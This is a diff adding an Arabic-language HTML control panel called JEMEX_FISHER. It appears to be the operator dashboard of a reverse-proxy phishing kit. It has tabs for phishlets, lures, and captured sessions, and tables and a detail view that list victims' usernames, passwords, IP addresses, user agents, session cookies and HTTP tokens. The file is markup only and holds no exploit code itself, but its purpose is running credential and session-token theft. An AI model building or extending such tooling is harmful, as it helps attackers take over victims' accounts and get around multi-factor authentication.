@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JEMEX_FISHER - لوحة التحكم</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/dashboard.css">
+</head>
+<body>
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"></path>
+                        <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
+                        <line x1="12" y1="19" x2="12" y2="22"></line>
+                    </svg>
+                </div>
+                <h2>JEMEX_FISHER</h2>
+            </div>
+            <nav class="sidebar-nav">
+                <ul>
+                    <li class="active" data-tab="dashboard">
+                        <a href="#dashboard"><i class="fas fa-chart-line"></i> الرئيسية</a>
+                    </li>
+                    <li data-tab="phishlets">
+                        <a href="#phishlets"><i class="fas fa-fish"></i> Phishlets</a>
+                    </li>
+                    <li data-tab="lures">
+                        <a href="#lures"><i class="fas fa-hook"></i> الطُعم</a>
+                    </li>
+                    <li data-tab="sessions">
+                        <a href="#sessions"><i class="fas fa-key"></i> الجلسات</a>
+                    </li>
+                    <li data-tab="settings">
+                        <a href="#settings"><i class="fas fa-cog"></i> الإعدادات</a>
+                    </li>
+                </ul>
+            </nav>
+            <div class="sidebar-footer">
+                <button id="logout-btn"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</button>
+            </div>
+        </aside>
+
+        <main class="content">
+            <header class="top-bar">
+                <div class="menu-toggle">
+                    <i class="fas fa-bars"></i>
+                </div>
+                <div class="top-bar-right">
+                    <div class="notifications">
+                        <i class="fas fa-bell"></i>
+                        <span class="notification-count">2</span>
+                    </div>
+                    <div class="user-info">
+                        <span class="user-name">المسؤول</span>
+                        <div class="user-avatar">
+                            <i class="fas fa-user"></i>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content-wrapper">
+                <!-- لوحة الداشبورد الرئيسية -->
+                <section id="dashboard-tab" class="tab-content active">
+                    <div class="dashboard-header">
+                        <h2>لوحة التحكم</h2>
+                        <p class="last-updated">آخر تحديث: <span id="last-update-time">جاري التحميل...</span></p>
+                    </div>
+
+                    <div class="stats-cards">
+                        <div class="stat-card">
+                            <div class="stat-card-icon blue">
+                                <i class="fas fa-fish"></i>
+                            </div>
+                            <div class="stat-card-info">
+                                <h3 id="phishlets-count">0</h3>
+                                <p>Phishlets</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon green">
+                                <i class="fas fa-hook"></i>
+                            </div>
+                            <div class="stat-card-info">
+                                <h3 id="lures-count">0</h3>
+                                <p>الطُعم</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon purple">
+                                <i class="fas fa-key"></i>
+                            </div>
+                            <div class="stat-card-info">
+                                <h3 id="sessions-count">0</h3>
+                                <p>الجلسات</p>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon red">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="stat-card-info">
+                                <h3 id="credentials-count">0</h3>
+                                <p>بيانات الاعتماد</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="dashboard-row">
+                        <div class="dashboard-col">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h3>آخر الجلسات</h3>
+                                    <a href="#sessions" class="btn-view-all">عرض الكل</a>
+                                </div>
+                                <div class="card-body">
+                                    <div class="table-responsive">
+                                        <table class="data-table" id="recent-sessions-table">
+                                            <thead>
+                                                <tr>
+                                                    <th>ID</th>
+                                                    <th>Phishlet</th>
+                                                    <th>اسم المستخدم</th>
+                                                    <th>IP</th>
+                                                    <th>الوقت</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                <tr>
+                                                    <td colspan="5" class="text-center">جاري التحميل...</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- قسم Phishlets -->
+                <section id="phishlets-tab" class="tab-content">
+                    <div class="section-header">
+                        <h2>Phishlets</h2>
+                        <button class="btn-primary refresh-btn" id="refresh-phishlets">
+                            <i class="fas fa-sync-alt"></i> تحديث
+                        </button>
+                    </div>
+
+                    <div class="table-responsive">
+                        <table class="data-table" id="phishlets-table">
+                            <thead>
+                                <tr>
+                                    <th>الاسم</th>
+                                    <th>المؤلف</th>
+                                    <th>الحالة</th>
+                                    <th>اسم المضيف</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td colspan="5" class="text-center">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- قسم الطُعم -->
+                <section id="lures-tab" class="tab-content">
+                    <div class="section-header">
+                        <h2>الطُعم</h2>
+                        <div>
+                            <button class="btn-primary" id="create-lure-btn">
+                                <i class="fas fa-plus"></i> إنشاء طُعم جديد
+                            </button>
+                            <button class="btn-secondary refresh-btn" id="refresh-lures">
+                                <i class="fas fa-sync-alt"></i> تحديث
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="table-responsive">
+                        <table class="data-table" id="lures-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Phishlet</th>
+                                    <th>اسم المضيف</th>
+                                    <th>المسار</th>
+                                    <th>URL إعادة التوجيه</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td colspan="6" class="text-center">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- قسم الجلسات -->
+                <section id="sessions-tab" class="tab-content">
+                    <div class="section-header">
+                        <h2>الجلسات</h2>
+                        <button class="btn-primary refresh-btn" id="refresh-sessions">
+                            <i class="fas fa-sync-alt"></i> تحديث
+                        </button>
+                    </div>
+
+                    <div class="table-responsive">
+                        <table class="data-table" id="sessions-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Phishlet</th>
+                                    <th>اسم المستخدم</th>
+                                    <th>كلمة المرور</th>
+                                    <th>العنوان</th>
+                                    <th>الوقت</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td colspan="7" class="text-center">جاري التحميل...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- قسم الإعدادات -->
+                <section id="settings-tab" class="tab-content">
+                    <div class="section-header">
+                        <h2>الإعدادات</h2>
+                    </div>
+
+                    <div class="settings-container">
+                        <div class="card">
+                            <div class="card-header">
+                                <h3>إعدادات الخادم</h3>
+                            </div>
+                            <div class="card-body">
+                                <div class="form-group">
+                                    <label for="domain">النطاق الرئيسي</label>
+                                    <input type="text" id="domain" class="form-control" placeholder="example.com">
+                                </div>
+                                <div class="form-group">
+                                    <label for="ip">عنوان IP</label>
+                                    <input type="text" id="ip" class="form-control" placeholder="0.0.0.0">
+                                </div>
+                                <div class="form-group">
+                                    <label for="redirect-url">URL إعادة التوجيه الافتراضي</label>
+                                    <input type="text" id="redirect-url" class="form-control" placeholder="https://example.com">
+                                </div>
+                                <button class="btn-primary" id="save-settings">حفظ الإعدادات</button>
+                            </div>
+                        </div>
+
+                        <div class="card">
+                            <div class="card-header">
+                                <h3>بيانات المصادقة</h3>
+                            </div>
+                            <div class="card-body">
+                                <div class="form-group">
+                                    <label for="new-username">اسم المستخدم الجديد</label>
+                                    <input type="text" id="new-username" class="form-control" placeholder="اسم المستخدم">
+                                </div>
+                                <div class="form-group">
+                                    <label for="new-password">كلمة المرور الجديدة</label>
+                                    <input type="password" id="new-password" class="form-control" placeholder="كلمة المرور">
+                                </div>
+                                <div class="form-group">
+                                    <label for="confirm-password">تأكيد كلمة المرور</label>
+                                    <input type="password" id="confirm-password" class="form-control" placeholder="تأكيد كلمة المرور">
+                                </div>
+                                <button class="btn-primary" id="change-credentials">تغيير بيانات المصادقة</button>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+    </div>
+
+    <!-- مودال إنشاء طُعم جديد -->
+    <div class="modal" id="create-lure-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>إنشاء طُعم جديد</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="lure-phishlet">Phishlet</label>
+                    <select id="lure-phishlet" class="form-control">
+                        <option value="">اختر Phishlet</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="lure-hostname">اسم المضيف (اختياري)</label>
+                    <input type="text" id="lure-hostname" class="form-control" placeholder="subdomain.example.com">
+                </div>
+                <div class="form-group">
+                    <label for="lure-path">المسار</label>
+                    <input type="text" id="lure-path" class="form-control" placeholder="/login">
+                </div>
+                <div class="form-group">
+                    <label for="lure-redirect">URL إعادة التوجيه (اختياري)</label>
+                    <input type="text" id="lure-redirect" class="form-control" placeholder="https://example.com">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-secondary modal-close-btn">إلغاء</button>
+                <button class="btn-primary" id="submit-lure">إنشاء</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- مودال عرض جلسة -->
+    <div class="modal" id="view-session-modal">
+        <div class="modal-content modal-lg">
+            <div class="modal-header">
+                <h3>تفاصيل الجلسة</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="session-details">
+                    <div class="loading-spinner" id="session-loading">
+                        <div class="spinner"></div>
+                        <p>جاري التحميل...</p>
+                    </div>
+                    <div id="session-content" class="session-content">
+                        <div class="session-info">
+                            <div class="info-item">
+                                <span class="info-label">معرف الجلسة:</span>
+                                <span class="info-value" id="session-id"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Phishlet:</span>
+                                <span class="info-value" id="session-phishlet"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">اسم المستخدم:</span>
+                                <span class="info-value" id="session-username"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">كلمة المرور:</span>
+                                <span class="info-value" id="session-password"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">عنوان IP:</span>
+                                <span class="info-value" id="session-ip"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">وكيل المستخدم:</span>
+                                <span class="info-value" id="session-useragent"></span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">تاريخ الإنشاء:</span>
+                                <span class="info-value" id="session-created"></span>
+                            </div>
+                        </div>
+
+                        <div class="tokens-section">
+                            <h4>رموز الكوكيز</h4>
+                            <div class="tokens-container" id="cookie-tokens">
+                                <p class="no-tokens">لا توجد رموز كوكيز</p>
+                            </div>
+
+                            <h4>رموز HTTP</h4>
+                            <div class="tokens-container" id="http-tokens">
+                                <p class="no-tokens">لا توجد رموز HTTP</p>
+                            </div>
+
+                            <h4>الحقول المخصصة</h4>
+                            <div class="tokens-container" id="custom-fields">
+                                <p class="no-tokens">لا توجد حقول مخصصة</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-danger" id="delete-session">حذف الجلسة</button>
+                <button class="btn-secondary modal-close-btn">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- التوستر للإشعارات -->
+    <div class="toaster" id="toaster"></div>
+
+    <script src="/static/js/dashboard.js"></script>
+</body>
+</html> 
